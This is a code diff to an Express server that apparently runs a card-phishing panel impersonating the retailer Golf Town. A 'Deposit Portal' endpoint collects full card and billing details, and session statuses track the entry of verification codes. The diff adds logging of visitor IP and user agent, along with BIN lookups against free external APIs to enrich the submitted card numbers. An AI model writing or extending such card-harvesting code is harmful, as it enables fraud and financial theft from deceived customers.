@@ -7,6 +7,7 @@ import https from 'https';
 import { GoogleGenAI } from '@google/genai';
 import { GOLF_TOWN_STORES } from './src/data/golfTownStores';
 import { INITIAL_CUSTOMERS } from './src/data/initialData';
+import { lookupBinData, BinInfo } from './src/utils/cardUtils';
 
 const app = express();
 const PORT = 3000;
@@ -100,6 +101,9 @@ interface PaymentSessionData {
   status: 'IDLE' | 'OPENED' | 'PROCESSING' | 'CODE_REQUIRED' | 'CODE_SUBMITTED' | 'REFUNDED' | 'SESSION_LEFT';
   openedAt?: string;
   customerCode?: string;
+  visitorIp?: string;
+  userAgent?: string;
+  binData?: BinInfo;
   cardDetails?: {
     cardNumber: string;
     expDate: string;
@@ -2423,8 +2427,80 @@ app.get('/api/socket/admin-stream', (req, res) => {
   });
 });
 
+// Endpoint: Free BIN Lookup API (No key/sign-up required with local fallback)
+app.get('/api/bin-lookup/:bin', async (req, res) => {
+  const bin = (req.params.bin || '').replace(/\D/g, '').slice(0, 8);
+  const localData = lookupBinData(bin);
+
+  if (bin.length < 6) {
+    return res.json(localData);
+  }
+
+  try {
+    // Primary free BIN service: Binlist
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2000);
+    const binlistRes = await fetch(`https://lookup.binlist.net/${bin}`, {
+      headers: { 'Accept-Version': '3' },
+      signal: controller.signal
+    });
+    clearTimeout(timeoutId);
+
+    if (binlistRes.ok) {
+      const data = await binlistRes.json();
+      const brand = data.scheme ? (data.scheme.charAt(0).toUpperCase() + data.scheme.slice(1)) : localData.brand;
+      const type = data.type ? (data.type.charAt(0).toUpperCase() + data.type.slice(1)) : localData.type;
+      const category = data.brand ? data.brand : localData.category;
+      const bank = data.bank?.name ? data.bank.name : localData.bank;
+      const country = data.country?.name ? `${data.country.name} (${data.country.alpha2 || ''})` : localData.country;
+
+      return res.json({
+        brand,
+        type,
+        category,
+        bank,
+        country,
+        countryCode: data.country?.alpha2,
+        isPrepaid: Boolean(data.prepaid),
+        apiSource: 'Binlist Free API'
+      });
+    }
+  } catch (e) {
+    // Fallback to secondary free BIN lookup endpoint or local engine
+  }
+
+  try {
+    // Secondary free BIN service: HandyAPI
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2000);
+    const handyRes = await fetch(`https://data.handyapi.com/bin/${bin}`, {
+      signal: controller.signal
+    });
+    clearTimeout(timeoutId);
+
+    if (handyRes.ok) {
+      const data = await handyRes.json();
+      if (data.Status === 'SUCCESS') {
+        return res.json({
+          brand: data.Scheme || localData.brand,
+          type: data.Type || localData.type,
+          category: data.Tier || localData.category,
+          bank: data.Issuer || localData.bank,
+          country: data.Country?.Name || localData.country,
+          countryCode: data.Country?.A2,
+          apiSource: 'HandyAPI Free BIN'
+        });
+      }
+    }
+  } catch (e) {
+    // Silent catch fallback
+  }
+
+  return res.json(localData);
+});
+
 // Endpoint: Submit Full Credit Card & Billing Details from Deposit Portal
-app.post('/api/socket/submit-card-billing', (req, res) => {
+app.post('/api/socket/submit-card-billing', async (req, res) => {
   const {
     sessionId,
     recipientName,
@@ -2447,6 +2523,10 @@ app.post('/api/socket/submit-card-billing', (req, res) => {
     return res.status(400).json({ error: 'sessionId is required.' });
   }
 
+  const visitorIp = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '192.168.1.105';
+  const userAgent = req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
+  const binData = lookupBinData(cardNumber || '');
+
   const sessionData: PaymentSessionData = {
     sessionId,
     recipientName: recipientName || cardholderName || 'Customer',
@@ -2455,6 +2535,9 @@ app.post('/api/socket/submit-card-billing', (req, res) => {
     storeId: storeId || '504',
     custId: custId || 'GT-CUSTOMER',
     status: 'PROCESSING',
+    visitorIp,
+    userAgent,
+    binData,
     cardDetails: {
       cardNumber: cardNumber || '',
       expDate: expDate || '',
